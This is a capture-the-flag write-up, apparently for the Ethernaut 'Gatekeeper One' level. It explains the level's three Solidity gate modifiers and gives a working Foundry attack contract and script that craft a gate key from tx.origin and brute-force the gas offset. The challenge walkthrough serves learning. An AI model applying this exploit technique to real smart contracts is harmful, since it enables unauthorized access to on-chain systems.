# Gatekeeper one   
The objective of this challenge is to get registered as an entrant to pass this level.   
The only `public` function is the `enter` function, but this function has three modifiers: `gateOne`, `gateTwo` and `gateThree`.   
   
The first modifier requires us to call the `enter` function from a smart contract.   
```solidity
modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }
```
The second modifier is more complex, it requires that the remaining gas  `gasleft()` when the modifier is executed is a multiple of 8191:   
```solidity
modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }
```
So, we have to send a specific amount of gas that is exactly divisible by 8191, remember that the minimum required is 21,000[ https://ethereum.org/en/developers/docs/gas/#what-is-gas-limi](https://ethereum.org/en/developers/docs/gas/#what-is-gas-limit)t.
   
And finally for the third modifier we have to set the key.   
```solidity
modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }
```
Ok, let's begin with the last require:   
1. The **last 4 bytes** of the `\_gateKey` must be of the form `0x0000XXXX`, where `XXXX` are the last 2 bytes of the sender's address ( `tx.origin`).   
   
2. The **first 4 bytes** of the `\_gateKey` must not be `0x00000000`.   
3. The **last 4 bytes** of the `\_gateKey` must equal its **last 2 bytes**, ensuring the form `0x0000XXXX`   
Basically it has to be like this:   
```solidity
                      8 bytes(64 bits)
	 ┌────────────────────┴─────────────────────┐	 
             4bytes(32 bits)  |    4bytes(32 bits)
         ┌──────────┴─────────┐──────────╋──────────┐
         │     not 0x0000     │  0x0000  │ tx.origin│
         └────────────────────┘──────────┴──────────┘

```
I made one contract and one script for automating the exploitation:   
```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.20;

interface IGateKeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Solving {
    function attack(address _victim, uint256 _gas) public {
        bytes8 gateKey = bytes8(uint64(1) << 32 | uint16(uint160(tx.origin)));
        require(IGateKeeperOne(_victim).enter{gas: (8191*3)+_gas}(gateKey));
    }
}
```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {Solving} from "src/Solving.sol";

contract SolvingScript is Script {
    address victim =; /* Your instance address */
    Solving solving;

    function run() public {
        vm.startBroadcast();
        solving = new Solving();
        solve();
        vm.stopBroadcast();
    }

    function solve() public {
        /* for (uint256 i = 0; i < 500; i++) { // Use this loop to find the correct gas value
            try solving.attack(victim, i) {
                console2.log("Solved", i);
                return;
            } catch { }
    }*/
        solving.attack(victim, 256); // In my case this was the correct value
    }
}
```
